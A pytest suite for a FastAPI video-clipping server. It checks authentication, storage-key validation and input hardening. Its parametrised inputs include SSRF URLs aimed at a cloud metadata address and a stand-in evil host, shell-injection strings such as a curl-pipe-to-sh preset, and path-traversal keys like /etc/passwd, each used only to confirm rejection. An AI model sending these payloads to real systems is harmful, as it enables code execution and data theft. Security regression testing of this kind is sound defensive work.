import hmac
import json
import os
import pathlib
import shutil
import subprocess
from typing import Any, Dict, List
from unittest.mock import MagicMock, patch

import pytest
from fastapi import HTTPException
from fastapi.security import HTTPAuthorizationCredentials
from fastapi.testclient import TestClient

import local_server
from core import schemas
from core.schemas import ClipItem, MomentsExtraction
from core.transcription import WhisperTranscriber
from local_server import app
from tests.manual_cuts_fixture import (
    FIXTURE_CUT_COUNT,
    FIXTURE_MAX_CUT_END_SECONDS,
    load_manual_cuts_payload,
)
from tests.storage_fakes import FakeObjectStorage

client = TestClient(app)

AUTH_HEADERS = {"Authorization": "Bearer test-secret"}


def test_health_check():
    response = client.get("/")
    assert response.status_code == 200
    assert response.json() == {"status": "ok"}


def test_download_youtube_requires_auth_token():
    response = client.post(
        "/download_youtube", json={"url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"}
    )
    assert response.status_code in (401, 403)


def test_download_youtube_rejects_wrong_auth_token():
    with patch.dict(os.environ, {"AUTH_TOKEN": "test-secret"}):
        response = client.post(
            "/download_youtube",
            json={"url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"},
            headers={"Authorization": "Bearer wrong-token"},
        )
        assert response.status_code == 401


# ---------------------------------------------------------------------------
# /download_youtube on the local runner — RNF-SEC-06 (SSRF) / RNF-SEC-18
# (s3_key contract). Same contract as main.download_youtube: shared
# core/youtube_downloader.py::download_youtube_to_s3 + pluggable storage
# (create_object_storage, MinIO in local dev). No more local-file shortcut:
# the returned s3_key is a storage key, never a /tmp path.
# ---------------------------------------------------------------------------

LOCAL_VALID_KEY = "youtube/3f2b8c1e-9a4d-4e6b-8f1a-2c3d4e5f6a7b/original.mp4"
LOCAL_VALID_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"


@pytest.fixture
def download_storage(monkeypatch):
    monkeypatch.setenv("AUTH_TOKEN", "test-secret")
    storage = FakeObjectStorage()
    monkeypatch.setattr(local_server, "create_object_storage", MagicMock(return_value=storage))
    return storage


class TestLocalDownloadYouTube:
    @pytest.mark.parametrize(
        "ssrf_url",
        [
            "http://169.254.169.254/latest/meta-data/",
            "http://evil.com/video",
            "https://youtube.com.evil.com/watch?v=x",
            "invalid",
        ],
    )
    def test_non_youtube_host_is_rejected_without_invoking_yt_dlp(
        self, download_storage, ssrf_url
    ):
        with patch("yt_dlp.YoutubeDL") as ydl, patch("subprocess.run") as run:
            response = client.post(
                "/download_youtube", json={"url": ssrf_url}, headers=AUTH_HEADERS
            )
        assert response.status_code == 400
        ydl.assert_not_called()
        run.assert_not_called()
        assert download_storage.uploads == []

    def test_valid_url_goes_through_shared_downloader_and_returns_storage_key(
        self, download_storage
    ):
        with patch.object(local_server, "download_youtube_to_s3") as download:
            download.return_value = {
                "s3_key": LOCAL_VALID_KEY,
                "title": "Podcast",
                "duration": 212,
                "thumbnail": "https://i.ytimg.com/x.jpg",
            }
            response = client.post(
                "/download_youtube",
                json={"url": LOCAL_VALID_URL, "s3_key": LOCAL_VALID_KEY},
                headers=AUTH_HEADERS,
            )
        assert response.status_code == 200
        data = response.json()
        assert data["success"] is True
        assert data["s3_key"] == LOCAL_VALID_KEY
        assert not data["s3_key"].startswith("/")
        assert data["title"] == "Podcast"
        assert data["duration"] == 212
        assert download.call_args.kwargs["url"] == LOCAL_VALID_URL
        assert download.call_args.kwargs["s3_key"] == LOCAL_VALID_KEY
        assert download.call_args.kwargs["storage"] is download_storage

    def test_omitted_s3_key_is_generated_as_storage_key(self, download_storage):
        with patch.object(local_server, "download_youtube_to_s3") as download:
            download.side_effect = lambda url, s3_key, storage: {
                "s3_key": s3_key,
                "title": "t",
                "duration": 1,
                "thumbnail": None,
            }
            response = client.post(
                "/download_youtube", json={"url": LOCAL_VALID_URL}, headers=AUTH_HEADERS
            )
        assert response.status_code == 200
        key = response.json()["s3_key"]
        assert key.startswith("youtube/") and key.endswith("/original.mp4")
        assert "/tmp" not in key
        # generated key satisfies the same contract a client-sent key must
        assert schemas.DownloadYouTubeRequest(url=LOCAL_VALID_URL, s3_key=key).s3_key == key

    @pytest.mark.parametrize(
        "bad_key",
        [
            "clips/other-user/video.mp4",
            "youtube/../clips/x.mp4",
            "/tmp/ai-podcast-clipper/abc.mp4",
            "youtube/not-a-uuid/original.mp4",
        ],
    )
    def test_invalid_s3_key_returns_422_before_any_download(self, download_storage, bad_key):
        with patch.object(local_server, "download_youtube_to_s3") as download:
            response = client.post(
                "/download_youtube",
                json={"url": LOCAL_VALID_URL, "s3_key": bad_key},
                headers=AUTH_HEADERS,
            )
        assert response.status_code == 422
        download.assert_not_called()

    def test_legacy_s3_bucket_field_returns_422(self, download_storage):
        with patch.object(local_server, "download_youtube_to_s3") as download:
            response = client.post(
                "/download_youtube",
                json={"url": LOCAL_VALID_URL, "s3_bucket": "test-bucket"},
                headers=AUTH_HEADERS,
            )
        assert response.status_code == 422
        download.assert_not_called()

    @pytest.mark.parametrize(
        "error_name,expected_status",
        [
            ("YouTubeVideoUnavailableError", 404),
            ("YouTubeAgeRestrictedError", 403),
            ("YouTubeDownloaderError", 500),
        ],
    )
    def test_downloader_errors_map_to_same_status_as_main(
        self, download_storage, error_name, expected_status
    ):
        from core import youtube_downloader

        error_cls = getattr(youtube_downloader, error_name)
        with patch.object(local_server, "download_youtube_to_s3", side_effect=error_cls("x")):
            response = client.post(
                "/download_youtube", json={"url": LOCAL_VALID_URL}, headers=AUTH_HEADERS
            )
        assert response.status_code == expected_status


def test_download_youtube_missing_url():
    with patch.dict(os.environ, {"AUTH_TOKEN": "test-secret"}):
        response = client.post(
            "/download_youtube", json={"uploaded_file_id": "123"}, headers=AUTH_HEADERS
        )
        assert response.status_code == 422


def test_process_video_requires_auth_token():
    response = client.post("/process_video", json={
        "video_url": "/tmp/fake.mp4",
        "uploaded_file_id": "123",
        "user_id": "user123"
    })
    assert response.status_code in (401, 403)


def test_process_video_endpoint():
    with patch.dict(os.environ, {"AUTH_TOKEN": "test-secret"}):
        response = client.post(
            "/process_video",
            json={
                "video_url": "/tmp/fake.mp4",
                "uploaded_file_id": "123",
                "user_id": "user123"
            },
            headers=AUTH_HEADERS,
        )
        # As long as it hits the endpoint and fails with validation or internal logic, route exists
        assert response.status_code in [200, 422, 500]


# ---------------------------------------------------------------------------
# POST /process_video v2 — manual cuts (spec 2026-10-09 contract v2, sections 6,
# 9 and 10). Phase 1 (RED): these tests must fail until the contract is
# implemented in core/schemas.py, core/video_pipeline.py and local_server.py.
#
# Scope of the mocks: WhisperX (transcriber), Gemini (identify_moments), LR-ASD,
# vertical reframe, subtitles and S3 upload are mocked. The real video is a
# short file generated by ffmpeg, so the cut and the ffprobe duration check
# run for real. The payload comes from tests/fixtures/manual_cuts_payload.json;
# only `s3_key` is replaced with PROCESS_VIDEO_KEY, a key in the real
# `youtube/<uuid>/original.mp4` format that the injected FakeObjectStorage
# serves with the bytes of the generated sample video (RNF-SEC-19: the input
# video always comes from storage, never from a local path).
# ---------------------------------------------------------------------------

REQUIRES_FFMPEG = pytest.mark.skipif(
    shutil.which("ffmpeg") is None or shutil.which("ffprobe") is None,
    reason="ffmpeg/ffprobe are required to generate and probe a real test video",
)

SAMPLE_VIDEO_DURATION_SECONDS = 15

PROCESS_VIDEO_KEY = "youtube/0b6c1a2e-4d5f-4a7b-9c8d-1e2f3a4b5c6d/original.mp4"

TRANSCRIPT_SEGMENTS: List[Dict[str, Any]] = [
    {"start": 0.0, "end": 0.4, "word": "Olá"},
    {"start": 0.5, "end": 0.9, "word": "pessoal"},
    {"start": 1.0, "end": 1.6, "word": "bem-vindos"},
]


# One word per second (absolute times) over the whole sample video.
ABSOLUTE_WORDS: List[Dict[str, Any]] = [
    {"start": float(i), "end": i + 0.8, "word": f"w{i}"}
    for i in range(SAMPLE_VIDEO_DURATION_SECONDS)
]


@pytest.fixture(scope="session")
def sample_video_path(tmp_path_factory: pytest.TempPathFactory) -> pathlib.Path:
    video_path = tmp_path_factory.mktemp("videos") / "sample-podcast.mp4"
    subprocess.run(
        [
            "ffmpeg", "-y",
            "-f", "lavfi", "-i",
            f"testsrc=duration={SAMPLE_VIDEO_DURATION_SECONDS}:size=320x240:rate=10",
            "-f", "lavfi", "-i",
            f"sine=frequency=440:duration={SAMPLE_VIDEO_DURATION_SECONDS}",
            "-c:v", "mpeg4", "-c:a", "aac", "-shortest",
            str(video_path),
        ],
        check=True,
        capture_output=True,
    )
    return video_path


@pytest.fixture
def pipeline_env(
    monkeypatch: pytest.MonkeyPatch, sample_video_path: pathlib.Path
) -> Dict[str, Any]:
    from core import clip_pipeline

    monkeypatch.setenv("AUTH_TOKEN", "test-secret")
    monkeypatch.setattr(local_server, "models_loaded", True)

    transcriber: WhisperTranscriber = MagicMock(spec=WhisperTranscriber)
    transcriber.transcribe.return_value = json.dumps(TRANSCRIPT_SEGMENTS)

    def _fake_transcribe_range(base_dir, video_path, start, end):
        # Same contract as WhisperTranscriber.transcribe_range: absolute times.
        return json.dumps(
            [w for w in ABSOLUTE_WORDS if w["end"] > start and w["start"] < end]
        )

    transcriber.transcribe_range.side_effect = _fake_transcribe_range
    monkeypatch.setattr(local_server.video_processor, "transcriber", transcriber)
    monkeypatch.setattr(local_server.video_processor, "gemini_client", MagicMock())

    # Phase 1b: the local runner gets its ObjectStorage from the shared factory,
    # held by the processor like transcriber/moments_provider. Tests inject a fake.
    # RNF-SEC-19: the sample video is served by the storage under a valid key.
    storage = FakeObjectStorage(files={PROCESS_VIDEO_KEY: sample_video_path.read_bytes()})
    monkeypatch.setattr(local_server.video_processor, "storage", storage)

    moments_provider = MagicMock()
    moments_provider.identify_moments.return_value = MomentsExtraction(
        clips=[
            ClipItem(
                title="Gancho do Gemini",
                hook="gancho",
                start=2.0,
                end=20.0,
                virality_score=7,
                reason="motivo",
            )
        ]
    )
    monkeypatch.setattr(local_server.video_processor, "moments_provider", moments_provider)
    identify_moments = moments_provider.identify_moments

    monkeypatch.setattr(
        clip_pipeline,
        "run_active_speaker_detection",
        MagicMock(return_value=([], [])),
    )
    monkeypatch.setattr(clip_pipeline, "create_vertical_video", MagicMock())
    create_subtitles = MagicMock()
    monkeypatch.setattr(clip_pipeline, "create_subtitles_with_ffmpeg", create_subtitles)

    return {
        "create_subtitles": create_subtitles,
        "transcriber": transcriber,
        "identify_moments": identify_moments,
        "video_path": sample_video_path,
        "storage": storage,
    }


def _payload_for_local_file(video_path: pathlib.Path) -> Dict[str, Any]:
    payload = load_manual_cuts_payload()
    # `video_path` is what the fake storage serves under PROCESS_VIDEO_KEY.
    payload["s3_key"] = PROCESS_VIDEO_KEY
    return payload


@REQUIRES_FFMPEG
class TestProcessVideoManualCutsIntegration:
    def test_manual_cuts_return_clips_at_requested_timestamps(self, pipeline_env):
        payload = _payload_for_local_file(pipeline_env["video_path"])

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 200
        clips = response.json()["clips"]
        assert len(clips) == FIXTURE_CUT_COUNT
        assert [(clip["start"], clip["end"]) for clip in clips] == [
            (0.0, 4.0),
            (4.0, 9.5),
            (8.0, 12.0),
        ]
        assert [clip["title"] for clip in clips] == [
            "Abertura",
            "Manual clip 2",
            "Corte sobreposto",
        ]
        assert all(clip["virality_score"] is None for clip in clips)

    def test_each_manual_clip_response_carries_its_clip_relative_words(self, pipeline_env):
        # Bug: the transcript never reached the DB. Words must come back in the
        # HTTP response of each clip as {word, start, end} relative to clip start.
        payload = _payload_for_local_file(pipeline_env["video_path"])

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 200
        clips = response.json()["clips"]
        # Cuts (0,4), (4,9.5), (8,12); one word per second, 0.8s long, absolute.
        expected_ranges = [(0.0, 4.0), (4.0, 9.5), (8.0, 12.0)]
        for clip, (start, end) in zip(clips, expected_ranges):
            expected = [
                {"word": w["word"], "start": max(0.0, w["start"] - start),
                 "end": min(end - start, w["end"] - start)}
                for w in ABSOLUTE_WORDS
                if w["end"] > start and w["start"] < end
            ]
            assert expected
            assert clip["words"] == pytest.approx(expected)
            assert all(0.0 <= w["start"] < w["end"] <= end - start for w in clip["words"])

    def test_clips_are_uploaded_through_the_injected_storage(self, pipeline_env):
        # D1: the local runner uploads every rendered clip via the shared
        # ObjectStorage port (not a hidden boto3 client), under clips/.
        payload = _payload_for_local_file(pipeline_env["video_path"])

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 200
        storage: FakeObjectStorage = pipeline_env["storage"]
        assert len(storage.uploads) == FIXTURE_CUT_COUNT
        assert all(key.startswith("clips/") for _, key in storage.uploads)

    def test_manual_mode_transcribes_only_the_cut_ranges(self, pipeline_env):
        # RN-PIPE-MANUAL-08: two distant cuts -> two ranges (0.5s margin,
        # clamped to [0, duration]); the whole video is never transcribed and
        # each clip's subtitles receive words with absolute times.
        payload = _payload_for_local_file(pipeline_env["video_path"])
        payload["manual_cuts"] = [{"start": 8.0, "end": 11.0}, {"start": 0.0, "end": 3.0}]

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 200
        transcriber = pipeline_env["transcriber"]
        transcriber.transcribe.assert_not_called()
        ranges = [(c.args[2], c.args[3]) for c in transcriber.transcribe_range.call_args_list]
        assert ranges == [(0.0, 3.5), (7.5, 11.5)]

        calls = pipeline_env["create_subtitles"].call_args_list
        assert len(calls) == 2
        by_start = {c.kwargs["clip_start"]: c.kwargs for c in calls}
        for clip_start, clip_end in [(8.0, 11.0), (0.0, 3.0)]:
            segments = by_start[clip_start]["transcript_segments"]
            in_clip = [w for w in segments if w["end"] > clip_start and w["start"] < clip_end]
            assert [w["word"] for w in in_clip] == [
                f"w{i}" for i in range(int(clip_start), int(clip_end))
            ]
            assert all(w["start"] == float(w["word"][1:]) for w in segments)
        # words from the untranscribed gap never reach the subtitles
        all_words = {w["word"] for c in calls for w in c.kwargs["transcript_segments"]}
        assert not all_words & {"w4", "w5", "w6"}

    def test_manual_mode_skips_gemini_and_never_transcribes_whole_video(self, pipeline_env):
        payload = _payload_for_local_file(pipeline_env["video_path"])

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 200
        pipeline_env["identify_moments"].assert_not_called()
        pipeline_env["transcriber"].transcribe.assert_not_called()
        pipeline_env["transcriber"].transcribe_range.assert_called()

    def test_manual_cut_exceeding_real_video_duration_returns_422(self, pipeline_env):
        # RN-PIPE-MANUAL-06: the video is 15s long, the cut ends at 20s.
        assert FIXTURE_MAX_CUT_END_SECONDS < SAMPLE_VIDEO_DURATION_SECONDS
        payload = _payload_for_local_file(pipeline_env["video_path"])
        payload["manual_cuts"][-1]["end"] = 20.0

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 422
        pipeline_env["transcriber"].transcribe.assert_not_called()

    def test_unknown_field_returns_422(self, pipeline_env):
        # RN-PIPE-MANUAL-13 / D2
        payload = _payload_for_local_file(pipeline_env["video_path"])
        payload["video_url"] = "https://example.com/podcast.mp4"

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 422

    def test_manual_mode_without_cuts_returns_422(self, pipeline_env):
        # RN-PIPE-MANUAL-02 / D5: never falls back to the automatic path.
        payload = _payload_for_local_file(pipeline_env["video_path"])
        payload["manual_cuts"] = []

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 422
        pipeline_env["identify_moments"].assert_not_called()

    def test_auto_mode_with_manual_cuts_returns_422(self, pipeline_env):
        # RN-PIPE-MANUAL-03
        payload = _payload_for_local_file(pipeline_env["video_path"])
        payload["mode"] = "auto"

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 422

    @pytest.mark.parametrize(
        "preset", ["$(curl x.yz|sh)", "`id`", "HORMOZI; touch /tmp/pwned"]
    )
    def test_shell_metachar_preset_returns_422_before_pipeline(self, pipeline_env, preset):
        # RCE regression: preset used to reach a shell=True ffmpeg command.
        payload = _payload_for_local_file(pipeline_env["video_path"])
        payload["preset"] = preset

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 422
        pipeline_env["transcriber"].transcribe.assert_not_called()

    def test_legacy_payload_without_mode_still_runs_automatic_path(self, pipeline_env):
        # Green guard, RN-PIPE-MANUAL-14: a caller with only s3_key/preset keeps working.
        payload = {"s3_key": PROCESS_VIDEO_KEY, "preset": "HORMOZI"}

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 200
        pipeline_env["identify_moments"].assert_called_once()
        clips = response.json()["clips"]
        assert len(clips) == 1
        assert clips[0]["title"] == "Gancho do Gemini"
        assert clips[0]["start"] == 2.0
        assert clips[0]["end"] == 20.0

    def test_automatic_clip_response_carries_its_clip_relative_words(self, pipeline_env):
        words = [
            {"start": 1.0, "end": 1.9, "word": "fora"},
            {"start": 2.5, "end": 3.0, "word": "dentro"},
            {"start": 19.5, "end": 21.0, "word": "borda"},
        ]
        pipeline_env["transcriber"].transcribe.return_value = json.dumps(words)
        payload = {"s3_key": PROCESS_VIDEO_KEY, "preset": "HORMOZI"}

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 200
        assert response.json()["clips"][0]["words"] == [
            {"word": "dentro", "start": 0.5, "end": 1.0},
            {"word": "borda", "start": 17.5, "end": 18.0},
        ]

    def test_input_video_is_downloaded_from_storage_under_the_requested_key(
        self, pipeline_env
    ):
        payload = _payload_for_local_file(pipeline_env["video_path"])

        response = client.post("/process_video", json=payload, headers=AUTH_HEADERS)

        assert response.status_code == 200
        storage: FakeObjectStorage = pipeline_env["storage"]
        assert [key for key, _ in storage.downloads] == [PROCESS_VIDEO_KEY]


# ---------------------------------------------------------------------------
# RNF-SEC-19 — /process_video on the local runner must never read an arbitrary
# local file: `s3_key` is restricted to the formats the system generates, and
# a local path is a 422 before any download/transcription. The main.py half
# lives in tests/test_process_video_s3_key_hardening.py.
# ---------------------------------------------------------------------------


@REQUIRES_FFMPEG
class TestLocalProcessVideoS3KeyHardening:
    @pytest.mark.parametrize(
        "bad_key",
        [
            "/etc/passwd",
            "../x",
            "uploads/user_2abc/0b6c1a2e-4d5f-4a7b-9c8d-1e2f3a4b5c6d/..",
            "clips/user_2abc/abc/clip_0.mp4",
        ],
    )
    def test_local_path_s3_key_returns_422_before_any_download(self, pipeline_env, bad_key):
        response = client.post(
            "/process_video",
            json={"s3_key": bad_key, "preset": "HORMOZI"},
            headers=AUTH_HEADERS,
        )

        assert response.status_code == 422
        storage: FakeObjectStorage = pipeline_env["storage"]
        assert storage.downloads == []
        pipeline_env["transcriber"].transcribe.assert_not_called()
        pipeline_env["identify_moments"].assert_not_called()


# ---------------------------------------------------------------------------
# RNF-SEC-07 — local_server.verify_auth_token bearer comparison must be
# constant-time. This is the local_server half of the auth suite; the
# main.process_video / main.download_youtube half lives in
# tests/test_auth_token_constant_time.py, which runs in the lean `backend` CI
# job (only requirements-test.txt, no torch). local_server.py does
# compatibility monkey-patching of pyannote/whisperx/torch at import time, so
# it can only be imported where torch/torchaudio are installed — i.e. here,
# in the job that installs the full requirements.txt.
# ---------------------------------------------------------------------------


def _auth_creds(value: str) -> HTTPAuthorizationCredentials:
    return HTTPAuthorizationCredentials(scheme="Bearer", credentials=value)


def _call_verify_auth_token(token: str) -> None:
    local_server.verify_auth_token(_auth_creds(token))


def _assert_401(token: str) -> None:
    with pytest.raises(HTTPException) as exc_info:
        _call_verify_auth_token(token)
    assert exc_info.value.status_code == 401


class TestVerifyAuthTokenConstantTime:
    SECRET = "test-secret"

    @pytest.fixture
    def compare_digest_spy(self, monkeypatch: pytest.MonkeyPatch):
        real = hmac.compare_digest
        spy = MagicMock(side_effect=real)
        monkeypatch.setattr(hmac, "compare_digest", spy)
        return spy

    def test_correct_token_is_accepted_via_compare_digest(self, monkeypatch, compare_digest_spy):
        monkeypatch.setenv("AUTH_TOKEN", self.SECRET)
        _call_verify_auth_token(self.SECRET)  # must not raise
        compare_digest_spy.assert_called()

    def test_wrong_token_is_rejected_via_compare_digest(self, monkeypatch, compare_digest_spy):
        monkeypatch.setenv("AUTH_TOKEN", self.SECRET)
        _assert_401("wrong-token")
        compare_digest_spy.assert_called()

    def test_rejects_any_token_when_auth_token_not_configured(self, monkeypatch):
        monkeypatch.delenv("AUTH_TOKEN", raising=False)
        _assert_401(self.SECRET)
        _assert_401("")

    def test_rejects_empty_token_when_auth_token_is_empty(self, monkeypatch):
        monkeypatch.setenv("AUTH_TOKEN", "")
        _assert_401("")

    def test_non_ascii_token_is_rejected_with_401_not_500(self, monkeypatch):
        monkeypatch.setenv("AUTH_TOKEN", self.SECRET)
        _assert_401("tést-secret")


# ---------------------------------------------------------------------------
# Manual cut input hardening (Phase 3 audit of the POST /process_video v2
# contract) — HTTP-level guard on the local runner. Moved here (out of
# tests/test_manual_cut_input_hardening.py, which runs in the lean `backend`
# CI job) because it imports local_server, which needs torch/torchaudio to
# import at all.
# ---------------------------------------------------------------------------


class TestProcessVideoEndpointRejectsHostileCutsWith422:
    """HTTP-level guard on the local runner: invalid cuts must be a 422 from
    the request contract, never reach the pipeline (no GPU time spent) and
    never be masked as 500 by the endpoint's generic `except Exception`."""

    @pytest.fixture
    def client_and_pipeline(self, monkeypatch):
        monkeypatch.setenv("AUTH_TOKEN", "test-secret")
        with patch.object(local_server.video_processor, "process_video") as process_video, \
                patch.object(local_server.video_processor, "load_model"):
            yield TestClient(local_server.app), process_video

    def _post_raw(self, client, raw_body: str):
        return client.post(
            "/process_video",
            content=raw_body,
            headers={
                "Authorization": "Bearer test-secret",
                "Content-Type": "application/json",
            },
        )

    @pytest.mark.parametrize("literal", ["NaN", "Infinity", "-Infinity"])
    def test_non_finite_end_literal_never_reaches_pipeline(self, client_and_pipeline, literal):
        # Known limitation (reported, not fixed here): the request IS rejected
        # by the contract, but FastAPI's default RequestValidationError handler
        # echoes the offending `input` (a non-finite float) back in the 422
        # body, and Starlette's JSONResponse refuses to serialize NaN/Inf
        # (allow_nan=False) — so the client sees a 500, not a 422. What this
        # test guarantees is the security-relevant part: the request is never
        # accepted (no 2xx) and never reaches the GPU pipeline.
        # The frontend can't trigger this: JSON.stringify(NaN) emits `null`.
        client, process_video = client_and_pipeline
        client = TestClient(client.app, raise_server_exceptions=False)
        raw = (
            '{"s3_key": "' + PROCESS_VIDEO_KEY + '", "mode": "manual", '
            '"manual_cuts": [{"start": 0, "end": ' + literal + "}]}"
        )

        response = self._post_raw(client, raw)

        assert response.status_code in (422, 500)
        process_video.assert_not_called()

    def test_oversized_title_returns_422(self, client_and_pipeline):
        client, process_video = client_and_pipeline
        payload = {
            "s3_key": PROCESS_VIDEO_KEY,
            "mode": "manual",
            "manual_cuts": [{"start": 0, "end": 5, "title": "x" * 201}],
        }

        response = client.post(
            "/process_video",
            json=payload,
            headers={"Authorization": "Bearer test-secret"},
        )

        assert response.status_code == 422
        process_video.assert_not_called()

    def test_more_than_max_cuts_returns_422(self, client_and_pipeline):
        client, process_video = client_and_pipeline
        payload = {
            "s3_key": PROCESS_VIDEO_KEY,
            "mode": "manual",
            "manual_cuts": [
                {"start": 0, "end": 5} for _ in range(schemas.MAX_MANUAL_CUTS + 1)
            ],
        }

        response = client.post(
            "/process_video",
            json=payload,
            headers={"Authorization": "Bearer test-secret"},
        )

        assert response.status_code == 422
        process_video.assert_not_called()
